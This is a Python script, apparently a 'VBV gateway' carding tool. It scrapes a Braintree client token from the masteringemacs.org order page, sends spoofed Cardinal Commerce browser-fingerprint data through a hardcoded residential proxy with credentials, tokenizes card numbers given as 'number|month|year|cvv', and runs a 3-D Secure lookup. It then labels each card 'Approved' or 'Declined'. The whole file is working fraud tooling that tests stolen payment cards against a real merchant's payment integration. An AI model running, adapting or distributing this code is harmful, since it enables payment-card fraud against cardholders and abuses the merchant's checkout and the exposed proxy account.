from requests import Session
import uuid
import base64
import json
from retry import retry



class CutStr():
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
        return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]

def SaveResponseHhml(response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f: f.write(response)


def DecodeBear(dato:str = None): return CutStr().QueryText(base64.b64decode(dato).decode('utf-8') , '"authorizationFingerprint":"','","')
        



class VbvGatereways:
    @retry(tries=3)
    def main(self,card):
        try:
            self.session = Session()
            self.session.proxies.update({"http://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060","https://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060",})

            self.uuid_client = str(uuid.uuid4())
            

            self.req_1 = self.session.get('https://www.masteringemacs.org/order')
            tokenBear = CutStr().QueryText(self.req_1.text,'data-client-token="','"')
            tokenbearfina = DecodeBear(tokenBear)
            
            
            json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': self.uuid_client,
            },
            'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
            'operationName': 'ClientConfiguration',
        }

            self.req_2 = self.session.post('https://payments.braintree-api.com/graphql', headers= {'authority': 'payments.braintree-api.com','authorization': f'Bearer {tokenbearfina}','braintree-version': '2018-05-10'}, json=json_data)
            
            merchantId = CutStr().QueryText(self.req_2.text,'"merchantId":"','"')
            cardinalAuthenticationJWT = CutStr().QueryText(self.req_2.text,'{"cardinalAuthenticationJWT":"','"')
        
            json_data = {
                        'BrowserPayload': {
                            'Order': {
                                'OrderDetails': {},
                                'Consumer': {
                                    'BillingAddress': {},
                                    'ShippingAddress': {},
                                    'Account': {},
                                },
                                'Cart': [],
                                'Token': {},
                                'Authorization': {},
                                'Options': {},
                                'CCAExtension': {},
                            },
                            'SupportsAlternativePayments': {
                                'cca': True,
                                'hostedFields': False,
                                'applepay': False,
                                'discoverwallet': False,
                                'wallet': False,
                                'paypal': False,
                                'visacheckout': False,
                            },
                        },
                        'Client': {
                            'Agent': 'SongbirdJS',
                            'Version': '1.35.0',
                        },
                        'ConsumerSessionId': None,
                        'ServerJWT': cardinalAuthenticationJWT,
                    }

            self.req_3 = self.session.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', json=json_data)
            bearer2 = CutStr().QueryText(self.req_3.text, '{"CardinalJWT":"', '"}')
            partes = bearer2.split('.')
            payload_codificado = partes[1]
                    
            ideference =  json.loads(base64.urlsafe_b64decode(payload_codificado + '=' * (4 - len(payload_codificado) % 4)))['ReferenceId']
            
            headers = {
            'authority': 'geo.cardinalcommerce.com',
            'origin': 'https://geo.cardinalcommerce.com',
            'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8ab288adb1562e003d3637&tmEventType=PAYMENT&referenceId={ideference}&geolocation=false&origin=Songbird',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            }

            json_data = {
                        'Cookies': {
                            'Legacy': True,
                            'LocalStorage': True,
                            'SessionStorage': True,
                        },
                        'DeviceChannel': 'Browser',
                        'Extended': {
                            'Browser': {
                                'Adblock': True,
                                'AvailableJsFonts': [],
                                'DoNotTrack': 'unknown',
                                'JavaEnabled': False,
                            },
                            'Device': {
                                'ColorDepth': 24,
                                'Cpu': 'unknown',
                                'Platform': 'Win32',
                                'TouchSupport': {
                                    'MaxTouchPoints': 0,
                                    'OnTouchStartAvailable': False,
                                    'TouchEventCreationSuccessful': False,
                                },
                            },
                        },
                        'Fingerprint': 'f9f30df37936982a8fe6d275f3e98441',
                        'FingerprintingTime': 780,
                        'FingerprintDetails': {
                            'Version': '1.5.1',
                        },
                        'Language': 'en-US',
                        'Latitude': None,
                        'Longitude': None,
                        'OrgUnitId': '5c8ab288adb1562e003d3637',
                        'Origin': 'Songbird',
                        'Plugins': [
                            'PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                            'Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                            'Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                            'Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                            'WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                        ],
                        'ReferenceId': ideference,
                        'Referrer': 'https://www.masteringemacs.org/',
                        'Screen': {
                            'FakedResolution': False,
                            'Ratio': 1.7786458333333333,
                            'Resolution': '1366x768',
                            'UsableResolution': '1366x728',
                            'CCAScreenSize': '02',
                        },
                        'CallSignEnabled': None,
                        'ThreatMetrixEnabled': False,
                        'ThreatMetrixEventType': 'PAYMENT',
                        'ThreatMetrixAlias': 'Default',
                        'TimeOffset': 300,
                        'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                        'UserAgentDetails': {
                            'FakedOS': False,
                            'FakedBrowser': False,
                        },
                        'BinSessionId': 'ce6b2cde-c82c-4291-9015-031e25b8c30a',
                    }

            self.session.post('https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',headers=headers,json=json_data,)

            ccs = card.split('|')
            
            json_data = {
                        'clientSdkMetadata': {
                            'source': 'client',
                            'integration': 'dropin2',
                            'sessionId': self.uuid_client,
                        },
                        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                        'variables': {
                            'input': {
                                'creditCard': {
                                    'number': ccs[0],
                                    'expirationMonth': ccs[1],
                                    'expirationYear': ccs[2],
                                    'cvv': ccs[3],
                                },
                                'options': {
                                    'validate': False,
                                },
                            },
                        },
                        'operationName': 'TokenizeCreditCard',
                    }

            self.req_4 = self.session.post('https://payments.braintree-api.com/graphql', headers={'authority': 'payments.braintree-api.com','authorization': f'Bearer {tokenbearfina}','braintree-version': '2018-05-10'}, json=json_data)
            token_card = CutStr().QueryText(self.req_4.text, '{"token":"', '"')

            json_data = {
                'amount': '39.75',
                'additionalInfo': {
                    'acsWindowSize': '03',
                },
                'bin': ccs[0][:6],
                'dfReferenceId': ideference,
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.85.2',
                    'cardinalDeviceDataCollectionTimeElapsed': 236,
                    'issuerDeviceDataCollectionTimeElapsed': 3628,
                    'issuerDeviceDataCollectionResult': True,
                },
                'authorizationFingerprint': tokenbearfina,
                'braintreeLibraryVersion': 'braintree/web/3.85.2',
                '_meta': {
                    'merchantAppId': 'www.masteringemacs.org',
                    'platform': 'web',
                    'sdkVersion': '3.85.2',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': self.uuid_client,
                },
            }

            response = self.session.post(f'https://api.braintreegateway.com/merchants/{merchantId}/client_api/v1/payment_methods/{token_card}/three_d_secure/lookup',json=json_data)
            self.session.close()
            
            code = response.json()['paymentMethod']['threeDSecureInfo']['status']
            
            if "authenticate_successful" in code: return "Approved! ✅",code
            elif "authentication_unavailable" in code: return "Approved! ✅",code
            elif "authenticate_attempt_successful" in code: return "Approved! ✅",code
            else: return "Declined! ❌",code
    
        except: return "Declined! ❌","error 3 Retry ( tries )" 



